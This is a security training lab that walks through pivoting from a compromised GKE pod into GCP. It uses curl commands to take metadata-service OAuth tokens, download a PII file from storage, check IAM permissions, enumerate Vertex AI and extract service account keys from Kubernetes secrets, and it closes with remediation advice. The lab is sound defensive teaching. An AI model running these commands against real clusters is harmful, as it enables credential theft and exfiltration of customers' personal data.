# Lab 08: Cluster to Cloud Pivot

> **Pivot**: Kubernetes Cluster -> GCP Cloud | **Difficulty**: Advanced | **Duration**: 40 min

## Objective

Demonstrate how an attacker with access to a GKE pod can pivot from the Kubernetes cluster into the broader GCP cloud environment. By exploiting the GCP metadata service, the legacy compute metadata endpoint, and the over-privileged GKE node service account, you will obtain GCP OAuth2 tokens, enumerate cloud storage buckets, exfiltrate data from GCS, discover IAM permissions, and access Vertex AI resources -- all from within a compromised pod.

## OWASP Mapping

- **A01:2021 - Broken Access Control**: GKE node service account has excessive IAM roles (roles/editor, roles/storage.admin, roles/aiplatform.admin)
- **A05:2021 - Security Misconfiguration**: Legacy metadata API enabled, no Workload Identity configured
- **A07:2021 - Identification and Authentication Failures**: Metadata endpoint provides credentials without additional authentication

## GCC Compliance Impact

| Framework | Control | Description |
|-----------|---------|-------------|
| CIS GKE Benchmark | 6.2.1 | Prefer using dedicated GCP service accounts with Workload Identity |
| CIS GKE Benchmark | 6.4.1 | Ensure legacy Compute Engine instance metadata APIs are disabled |
| CIS GCP Benchmark | 1.5 | Ensure that Service Account has no admin privileges |
| NIST SP 800-190 | 4.4.2 | Host OS protection and metadata services |
| PCI DSS 4.0 | 7.2.1 | Appropriate access control model defined |
| SOC 2 | CC6.1 | Logical access security over protected information assets |
| ISO 27001 | A.5.15 | Access control policy for cloud resources |

## Prerequisites

- Completed Lab 03 (GCP metadata access confirmed) or Lab 07 (cluster access achieved)
- Shell access inside a GKE pod (via `kubectl exec` or command injection)
- `curl` available in the container
- Basic understanding of GCP IAM and metadata services

## Attack Steps

### Step 1: Query the GCP Metadata Service for Instance Information

From inside the pod, access the GCP metadata service to gather information about the underlying compute instance.

**Command:**

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/?recursive=true" | \
  python3 -m json.tool | head -30
```

**Expected Output:**

```text
{
    "attributes": {},
    "cpuPlatform": "Intel Broadwell",
    "description": "",
    "hostname": "gke-vuln-cluster-default-pool-xxxxxxxx-xxxx.c.PROJECT_ID.internal",
    "id": 1234567890123456789,
    "machineType": "projects/PROJECT_ID/machineTypes/e2-medium",
    "name": "gke-vuln-cluster-default-pool-xxxxxxxx-xxxx",
    "networkInterfaces": [
        {
            "accessConfigs": [
                {
                    "externalIp": "34.XXX.XXX.XXX",
                    "type": "ONE_TO_ONE_NAT"
                }
            ],
            "ip": "10.128.0.XX",
            "network": "projects/PROJECT_ID/networks/default"
        }
    ],
    "zone": "projects/PROJECT_ID/zones/us-central1-a"
}
```

The GCP metadata service at `169.254.169.254` is accessible from any pod running on a GKE node when legacy metadata is enabled. This single request reveals the full instance configuration including project ID, zone, machine type, network configuration, and the external IP address of the node. This is the reconnaissance foundation for all subsequent cloud attacks.

### Step 2: Discover Service Accounts via Metadata

Enumerate the GCP service accounts available through the metadata endpoint to understand the credential scope.

**Command:**

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/"
```

**Expected Output:**

```text
default/
PROJECT_NUMBER-compute@developer.gserviceaccount.com/
```

The metadata service exposes the service accounts attached to the GKE node. The `default` entry maps to the Compute Engine default service account, which in this lab environment has `roles/editor`, `roles/storage.admin`, and `roles/aiplatform.admin` attached. Without Workload Identity, every pod on this node inherits these overly broad permissions.

### Step 3: Obtain a GCP OAuth2 Access Token

Request an OAuth2 access token from the metadata service. This token inherits all IAM permissions of the node service account.

**Command:**

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

**Expected Output:**

```text
{
  "access_token": "ya29.c.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**Command:**

```bash
GCP_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo "Token obtained: ${GCP_TOKEN:0:20}..."
```

**Expected Output:**

```text
Token obtained: ya29.c.XXXXXXXXXXXXXXX...
```

This access token is valid for approximately one hour and grants the bearer all IAM permissions assigned to the node service account. The token is obtained without any additional authentication -- merely being in a pod on the node is sufficient. This is the key credential for all subsequent cloud API calls.

### Step 4: List GCS Buckets Using the Stolen Token

Use the OAuth2 token to call the GCP Cloud Storage API and enumerate all buckets in the project.

**Command:**

```bash
PROJECT_ID=$(curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/project/project-id")

curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID" | \
  python3 -m json.tool
```

**Expected Output:**

```text
{
    "kind": "storage#buckets",
    "items": [
        {
            "kind": "storage#bucket",
            "id": "vuln-ai-governance-data-PROJECT_ID",
            "name": "vuln-ai-governance-data-PROJECT_ID",
            "projectNumber": "123456789012",
            "location": "US-CENTRAL1",
            "storageClass": "STANDARD",
            "iamConfiguration": {
                "uniformBucketLevelAccess": {
                    "enabled": true
                }
            }
        }
    ]
}
```

The `roles/storage.admin` permission on the node service account allows full enumeration and access to all GCS buckets in the project. The bucket `vuln-ai-governance-data-PROJECT_ID` is identified as containing the AI governance data, including PII datasets and knowledge base documents. Note the absence of Customer-Managed Encryption Keys (CMEK) -- the bucket uses only Google-managed encryption.

### Step 5: Read PII Data from the GCS Bucket

Download the PII dataset directly from the GCS bucket using the stolen access token.

**Command:**

```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/vuln-ai-governance-data-$PROJECT_ID/o" | \
  python3 -c "import sys,json; [print(o['name']) for o in json.load(sys.stdin).get('items',[])]"
```

**Expected Output:**

```text
knowledge_base/financial_policies.txt
knowledge_base/compliance_rules.txt
knowledge_base/risk_framework.txt
sample_pii.json
model_config.json
```

**Command:**

```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/vuln-ai-governance-data-$PROJECT_ID/o/sample_pii.json?alt=media"
```

**Expected Output:**

```text
[
  {
    "customer_id": "CUST-001",
    "name": "Ahmad Al-Rashid",
    "national_id": "1087654321",
    "iban": "SA0380000000608010167519",
    "email": "ahmad@example.com",
    "risk_score": 0.75
  },
  ...
]
```

The attacker can now read all objects in the bucket, including PII data and AI knowledge base documents. Because the bucket is configured as public and lacks CMEK encryption, there are no additional access barriers beyond the IAM permissions already obtained through the metadata service.

### Step 6: Check IAM Permissions

Use the stolen token to query the IAM API and enumerate the permissions assigned to the service account, confirming the scope of access.

**Command:**

```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "permissions": [
      "storage.buckets.list",
      "storage.objects.get",
      "storage.objects.create",
      "storage.objects.delete",
      "iam.serviceAccounts.list",
      "compute.instances.list",
      "aiplatform.endpoints.list",
      "aiplatform.models.list",
      "resourcemanager.projects.getIamPolicy"
    ]
  }' \
  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID:testIamPermissions"
```

**Expected Output:**

```text
{
  "permissions": [
    "storage.buckets.list",
    "storage.objects.get",
    "storage.objects.create",
    "storage.objects.delete",
    "iam.serviceAccounts.list",
    "compute.instances.list",
    "aiplatform.endpoints.list",
    "aiplatform.models.list"
  ]
}
```

The `testIamPermissions` API confirms which permissions the token holder actually has. The results reveal full storage read/write/delete access, compute instance enumeration, Vertex AI platform access, and service account listing. The only permission not granted is `resourcemanager.projects.getIamPolicy`, which means the attacker cannot directly read the project IAM policy -- but the existing permissions are more than sufficient for data exfiltration and AI platform abuse.

### Step 7: Enumerate Vertex AI Resources

Use the access token to discover Vertex AI models, endpoints, and datasets in the project.

**Command:**

```bash
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://us-central1-aiplatform.googleapis.com/v1/projects/$PROJECT_ID/locations/us-central1/endpoints" | \
  python3 -m json.tool
```

**Expected Output:**

```text
{
    "endpoints": [
        {
            "name": "projects/PROJECT_ID/locations/us-central1/endpoints/1234567890",
            "displayName": "ai-governance-endpoint",
            "deployedModels": [
                {
                    "id": "gemini-model-001",
                    "model": "publishers/google/models/gemini-1.5-flash",
                    "displayName": "governance-ai-model"
                }
            ],
            "createTime": "2024-01-15T10:00:00Z"
        }
    ]
}
```

The `roles/aiplatform.admin` permission grants full access to Vertex AI resources, including the ability to query endpoints, list models, access training datasets, and invoke prediction APIs. The attacker can now see the AI governance model deployment and could send malicious prompts directly to the model endpoint, bypassing the application-layer controls.

### Step 8: Check for GCP Service Account Keys in Kubernetes Secrets

Search Kubernetes secrets for stored GCP service account keys, which would provide persistent cloud access independent of the metadata service.

**Command:**

```bash
TOKEN_K8S=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

for ns in ai-governance finance-prod default; do
  echo "=== Namespace: $ns ==="
  curl -sk -H "Authorization: Bearer $TOKEN_K8S" \
    "https://kubernetes.default.svc/api/v1/namespaces/$ns/secrets" | \
    python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
for item in data.get('items', []):
    for key, val in item.get('data', {}).items():
        if 'key' in key.lower() or 'gcp' in key.lower() or 'google' in key.lower() or 'credentials' in key.lower():
            print(f\"  Secret: {item['metadata']['name']}, Key: {key}\")
            decoded = base64.b64decode(val).decode('utf-8', errors='replace')[:100]
            print(f\"  Value (first 100 chars): {decoded}\")
" 2>/dev/null
done
```

**Expected Output:**

```text
=== Namespace: ai-governance ===
  Secret: gcp-sa-key, Key: credentials.json
  Value (first 100 chars): {"type": "service_account", "project_id": "PROJECT_ID", "private_key_id": "abc123", "private_key":
=== Namespace: finance-prod ===
=== Namespace: default ===
```

A GCP service account key stored as a Kubernetes secret provides persistent, long-lived access to GCP that does not depend on the metadata service and does not expire like OAuth2 tokens. If an attacker extracts this key, they can authenticate to GCP from anywhere -- even after losing access to the cluster. This represents the most dangerous form of credential exposure because the key has no automatic expiration.

## Remediation

1. **Enable GKE Workload Identity**: Configure Workload Identity to bind Kubernetes service accounts to GCP IAM service accounts with granular, per-pod permissions instead of sharing the node-level service account.

2. **Disable Legacy Metadata API**: Set `disable-legacy-endpoints` to `true` on GKE node pools to block the v1beta1 metadata endpoint and require the `Metadata-Flavor: Google` header.

3. **Apply Least-Privilege IAM**: Replace `roles/editor`, `roles/storage.admin`, and `roles/aiplatform.admin` on the node service account with custom roles containing only the minimum required permissions.

4. **Enable GKE Metadata Server**: Use the GKE metadata server (GKE_METADATA) which intercepts metadata requests and returns Workload Identity credentials instead of node credentials.

5. **Remove Stored Service Account Keys**: Delete any GCP service account keys stored in Kubernetes secrets. Use Workload Identity or federated authentication instead of long-lived key files.

6. **Enable VPC Service Controls**: Create a VPC Service Controls perimeter around sensitive GCP services (Storage, AI Platform) to prevent data exfiltration even with valid credentials.

7. **Configure CMEK for GCS Buckets**: Enable Customer-Managed Encryption Keys for GCS buckets containing sensitive data, providing an additional access control layer beyond IAM.

8. **Audit Metadata Access**: Enable GKE audit logging to detect pods making metadata service requests, particularly for token endpoints.

## Key Takeaways

- The GCP metadata service at `169.254.169.254` is the bridge between the Kubernetes cluster and the GCP cloud -- any pod on a GKE node can request cloud credentials unless Workload Identity is enabled.
- A GKE node service account with `roles/editor` effectively grants project-wide access to any workload running on that node, collapsing all cloud IAM boundaries.
- The pivot from cluster to cloud is trivial: a single `curl` command to the metadata service provides a fully functional OAuth2 token with all the node service account's IAM permissions.
- GCP service account keys stored as Kubernetes secrets provide persistent cloud access that survives cluster remediation and does not require metadata service access.
- Workload Identity is the single most important control for preventing cluster-to-cloud pivots on GKE, as it eliminates the shared node service account model entirely.
